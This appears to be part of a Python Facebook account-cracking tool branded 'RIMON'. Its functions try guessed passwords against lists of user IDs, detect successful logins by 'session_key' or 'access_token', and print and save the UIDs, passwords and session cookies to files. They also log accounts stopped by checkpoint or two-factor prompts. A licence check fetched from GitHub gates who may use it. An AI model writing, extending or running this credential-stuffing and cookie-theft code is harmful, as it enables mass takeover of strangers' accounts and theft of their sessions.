...
def rimon4():
        ...
        return ua					
#-----------------------------------------------------#
sys.stdout.write('\x1b]2;RIMON-AHMED💚🥀\x07')
#-----------------------------------------------------#
vers = requests.get('https://raw.githubusercontent.com/RIMON-143/XYZ-369/main/approve.txt').text
version = str(vers)
#-------------------------------#
os.system('xdg-open https://github.com/RIMON-143')
logo = (f"""
  \x1b[38;5;46m██████  ██ ███    ███  ██████  ███    ██ 
  \x1b[38;5;47m██   ██ ██ ████  ████ ██    ██ ████   ██ 
  \x1b[38;5;48m██████  ██ ██ ████ ██ ██    ██ ██ ██  ██ 
...
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    \x1b[1;97m ● \x1b[1;92mRIMON AHMED             
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK  \x1b[1;97m ● \x1b[1;92mMD RIMON            
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB    \x1b[1;97m ● \x1b[1;92mRIMON-143      
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/RIMON-143/PAID/blob/main/Approve.txt').text    
    if id in httpCaht:
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bRIMON}[{G}RIMON-M2{bRIMON}]-[{G}%s{bRIMON}]-[{G}OK:%s{bRIMON}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\x1b[1;92m[RIMON-OK💚] '+uid+' | '+pas+'|'+asha(uid)+'\x1b[1;92m')                                
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{ckkk}"
                                        print('\033[1;37m [COOKIES🍪]==>  '+cookies)
                                        open('/sdcard/RIMON-M2-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                                        oks.append(uid)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[RIMON-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;32m[RIMON-CP] '+ids+' | '+pas+'\033[1;32m')
                                                open('/sdcard/RIMON-CHECKPOINT.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/RIMON-CHECKPOINT.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r {bRIMON}[{G}RIMON-M1{bRIMON}]-[{G}%s{bRIMON}]-[{G}OK:%s{bRIMON}]'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/RIMON-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [RIMON-CHECKPOINT] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RIMON-CHECKPOINT.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def M3Z(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRIMON-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRIMON}[{G}RIMON-OK{bRIMON}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bRIMON}[{G}•{bRIMON}]{G} '+kuki+'')
                linex()
                open('/sdcard/RIMON-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+cookie+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
